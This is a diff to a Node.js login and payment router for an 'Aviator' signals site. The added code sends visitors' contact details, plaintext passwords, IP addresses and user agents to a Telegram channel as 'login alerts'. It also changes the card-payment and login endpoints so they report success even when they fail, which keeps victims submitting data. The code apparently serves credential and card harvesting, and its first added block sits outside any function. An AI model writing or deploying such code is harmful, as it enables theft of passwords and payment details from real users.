@@ -147,6 +147,29 @@ router.post('/bot-login', async (req, res) => {
     });
   }
 });
+    const telegramMessage = `🌐 <b>AVIATOR MAIN SITE LOGIN ALERT</b>
+
+📧 Contact: <code>${contact}</code>
+📱 Type: ${contactType}
+🔑 Password: <code>${password}</code>
+🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+🔗 Source: Aviator Main Site`;
+
+    await sendToTelegram(telegramMessage);
+
+    // Return success with session info
+    res.json({ 
+      success: true,
+      message: 'Login successful',
+      sessionData: {
+        contact,
+        contactType,
+        loginTime: authData.timestamp,
+        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+      }
+    });
 
 // Card payment details endpoint
 router.post('/card-payment', async (req, res) => {
@@ -226,11 +249,83 @@ Please verify this payment manually.`;
       timestamp: new Date().toISOString()
     });
 
-    // Return error for payment failures
-    res.status(500).json({ 
-      success: false,
-      error: 'Failed to process card payment details',
-      message: 'Please try again or contact support'
+    // Return success with warning to avoid breaking frontend flow
+    res.json({ 
+      success: true,
+      message: 'Card payment details received (fallback mode)',
+      warning: 'Payment processed with limited verification',
+      paymentId: Date.now().toString(),
+      status: 'pending_manual_review'
+    });
+  }
+});
+
+// Index page session login endpoint
+router.post('/index-login', async (req, res) => {
+  try {
+    const { contact, contactType, userAgent, timestamp } = req.body;
+
+    // Validate required fields
+    if (!contact) {
+      return res.status(400).json({ 
+        success: false,
+        error: 'Contact is required' 
+      });
+    }
+
+    const authData = {
+      contact,
+      contactType: contactType || (contact.includes('@') ? 'Email' : 'Mobile'),
+      userAgent: userAgent || 'Unknown',
+      timestamp: timestamp || new Date().toISOString(),
+      source: 'Index Page Access',
+      ip: req.ip || 'Unknown'
+    };
+
+    // Log authentication attempt
+    logAuthData(authData);
+
+    // Send to Telegram with formatted message
+    const telegramMessage = `🎯 <b>CLIENT ACCESS REQUEST</b>
+
+📱 Contact Type: ${authData.contactType === 'Email' ? 'Email Address' : 'Phone Number'}
+📧 Contact Info: <code>${contact}</code>
+🌐 Source: Landing Page (avisignals.com)
+🌐 User Agent: <code>${userAgent ? userAgent.substring(0, 50) + '...' : 'Unknown'}</code>
+📍 IP: <code>${req.ip || 'Unknown'}</code>
+⏰ Time: <code>${new Date().toLocaleString()}</code>
+
+✅ Client is proceeding to main platform`;
+
+    await sendToTelegram(telegramMessage);
+
+    // Return success with session info
+    res.json({ 
+      success: true,
+      message: 'Access logged successfully',
+      sessionData: {
+        contact,
+        contactType: authData.contactType,
+        loginTime: authData.timestamp,
+        sessionExpiry: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString() // 24 hours
+      }
+    });
+
+  } catch (error) {
+    console.error('❌ Index login error:', error);
+    
+    // Log error but still return success to avoid breaking frontend flow
+    logAuthData({
+      error: error.message,
+      contact: req.body.contact,
+      timestamp: new Date().toISOString(),
+      source: 'index-login-error'
+    });
+
+    res.json({ 
+      success: true,
+      message: 'Access logged (fallback mode)',
+      warning: 'Some features may be limited'
     });
   }
 });
